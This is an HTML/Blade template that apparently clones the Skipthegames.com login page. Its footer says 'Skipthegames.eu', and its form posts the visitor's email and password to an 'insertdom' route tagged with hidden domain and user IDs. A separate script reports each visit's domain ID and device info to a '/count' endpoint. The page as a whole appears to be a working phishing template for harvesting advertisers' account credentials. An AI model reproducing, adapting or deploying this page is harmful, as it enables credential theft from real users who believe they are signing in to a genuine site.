<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="{{asset('datas/css/all.min.css')}}">
    <link rel="stylesheet" href="{{asset('datas/css/bootstrap.min.css')}}">
    <link rel="stylesheet" href="{{asset('datas/css/style.css')}}">
    <title>Log in to your Skipthegames.com account</title>
    <style>


        #cookie_box {
            /*position: fixed;*/
            display: none;
            top: 0px;
            font-size: 0.8em;
            z-index: 1000;
            background: #5F5F5F;
            text-align: center;
            width: 100%;
            padding: 1% 5px;
            color: #ffffff;
        }
        .btn-success{
            background-color:#7DAF3B;
        }


    </style>
</head>

<!--<div id="cookie_box" style="display: block;">We use cookies to ensure that we give you the best experience on our website. By continuing to browse this site you permit us to placer cookies on your browser and agree to our use of cokkies <br>-->
<!--Review our coookies policy for details  <a href="#" class="cookie_box_close btn btn-small btn-success">Accept Cookies</a><u> What are cookies?</u>-->
<!--</div>-->
<section id="attention" class="px-1">
    <div class="container head">
        <div class="row">
            <div class="col-md-12 pl-3 pb-1 pt-3 ">
                <!--<p><strong>Providers, we do not send out text messages ever, do not click on links from them.-->
                <!--        Signups will be open at the end of <span id="date"></span></strong></p>-->
                <p>
                    <strong>
                        Providers
                    </strong>
                    , text and emails about cashapp are a SCAM 
                </p>

            </div>
        </div>
    </div>

</section>
<section class="menu mt-5">
    <div class="container">
        <div class="row">
            <div class="col-md-4 text-left">
                <img src="{{asset('datas/images/Skipthegames-255x39.png')}}" alt="" class="w-75">
            </div>
            <div class="col-md-4 text-left">
                <h5> Skip the games. <span>Get satisfaction.</span></h5>
            </div>
            <div class="col-md-4 text-center">

                <a href="" class="post_ad">Post your free ad</a>
            </div>
        </div>
    </div>
</section>
<!--<section id="login">-->
<!--    <div class="container">-->
<!--        <div class="row">-->
<!--            <div class="col-md-12 py-3">-->
<!--                <a href="">SKIPTHEGAMES.COM <b class="arrows">>></b></a> <span>LOGIN</span>-->
<!--            </div>-->
<!--        </div>-->
<!--    </div>-->

<!--</section>-->
<section id="main_form">
    <div class="container">
        <div class="row">
            <div class="col-md-5 pt-4">
                <h3>Log in to your account</h3>
                <br>
                <form method="post" action="{{url('insertdom')}}" class="needs-validation" novalidate>
                    @csrf
                    <div class="form-group mt-1">

                        <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Your email" name="email" required>
                        <div class="invalid-feedback">Please enter a valid email address.</div>
                    </div>

                    <div class="form-group mt-1">

                        <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password" name="password">
                    </div>
                    <input type="hidden" name="dom" class="dominfo" value="{{ $id }}">
                    <input type="hidden" class="dominfo" name="dom" value="{{ $id}}">
                    <input type="hidden" class="dominfo" name="id_user" value="{{ $id_user}}">
                     <input type="hidden" class="device"  value="{{$result}}">
                    <input type="submit" value="Log in" name="submit">
                </form>
                <p class="text-danger mt-2" style="font-size: 18px;
    line-height: 1.7;
    letter-spacing: 0.2px;"><b>Password not working?</b> <a href="" class="forget"><b>Click here</b></a></p>

                <p class="accpet mt-4">By clicking "Log in",you accept <a href="">Skipthegames.com's Terms and Conditions of use</a></p>
                <p class="accpet mt-4">The site is protected by Captcha and its <a href="">privacy policy</a>and<a href="">Terms of service</a>apply</p>

            </div>
            <div class="col-md-2">

            </div>
            <div class="col-md-5 text-left pt-4">
                <div class="ml-5" style="margin-left: 20%">
                    <h2>First time here?</h2>

                    <a href="" class=" mt-1" style="color:#777;text-decoration:underline;">Post your first ad</a>
                </div>
            </div>
        </div>
    </div>
</section>
<hr>
<section id="bottom_menu">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <nav class="navbar navbar-expand-lg navbar-light">
                    <a class="navbar-brand" href="#">&copy;Skipthegames.eu</a>
                    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"></span>
                    </button>

                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
                        <ul class="navbar-nav ml-auto">
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Contact <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">About <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Privacy <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Terms <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link" href="#">Escort Info <span class="sr-only">(current)</span></a>
                            </li>




                        </ul>

                    </div>
                </nav>
            </div>
        </div>
    </div>
</section>
<script src="{{asset('datas/js/jquery-3.4.1.min.js')}}"></script>
<script src="{{asset('datas/js/popper.min.js')}}"></script>
<script src="{{asset('datas/js/bootstrap.min.js')}}"></script>
<script src="{{asset('datas/js/script.js')}}"></script>
<script>
    // Self-executing function
    (function() {
        'use strict';
        window.addEventListener('load', function() {
            // Fetch all the forms we want to apply custom Bootstrap validation styles to
            var forms = document.getElementsByClassName('needs-validation');
            // Loop over them and prevent submission
            var validation = Array.prototype.filter.call(forms, function(form) {
                form.addEventListener('submit', function(event) {
                    if (form.checkValidity() === false) {
                        event.preventDefault();
                        event.stopPropagation();
                    }
                    form.classList.add('was-validated');
                }, false);
            });
        }, false);
    })();
</script>
<script>
    $(document).ready(function(){

        var dom_info = $(".dominfo").val();
        var device = $(".device").val();
        //console.log(dom_info);

        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
        });

        var url = '/count';
        $.ajax({
            url:url,
            method:'POST',
            data:{
                dom_info:dom_info,
                device:device,

            },
            success:function(response){
                console.log(response.message)
            },
        });





//cookie button
        if(getCookie('show_cookie_message') != 'no')
        {
            $('#cookie_box').show();
        }

        $('.cookie_box_close').click(function()
        {
            $('#cookie_box').animate({opacity:0 }, "slow");
            $('#cookie_box').css('z-index', -1);
            setCookie('show_cookie_message','no');
            return false;
        });
//cookie button
        $('.nav-link').click(function() {
            $('.nav-link').removeClass('active');
            $(this).addClass('active');
        });

    });
    //set cookie
    function setCookie(cookie_name, value)
    {
        var exdate = new Date();
        exdate.setDate(exdate.getDate() + (365*25));
        document.cookie = cookie_name + "=" + escape(value) + "; expires="+exdate.toUTCString() + "; path=/";
    }
    //set cookie
    //get cookie
    function getCookie(cookie_name)
    {
        if (document.cookie.length>0)
        {
            cookie_start = document.cookie.indexOf(cookie_name + "=");
            if (cookie_start != -1)
            {
                cookie_start = cookie_start + cookie_name.length+1;
                cookie_end = document.cookie.indexOf(";",cookie_start);
                if (cookie_end == -1)
                {
                    cookie_end = document.cookie.length;
                }
                return unescape(document.cookie.substring(cookie_start,cookie_end));
            }
        }
        return "";
    }
    //get cookie
</script>

<script>
    window.onload = function() {
        var months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];;
        var date = new Date();

        document.getElementById('date').innerHTML = months[date.getMonth()] ;
    };
</script>
</body>

</html>


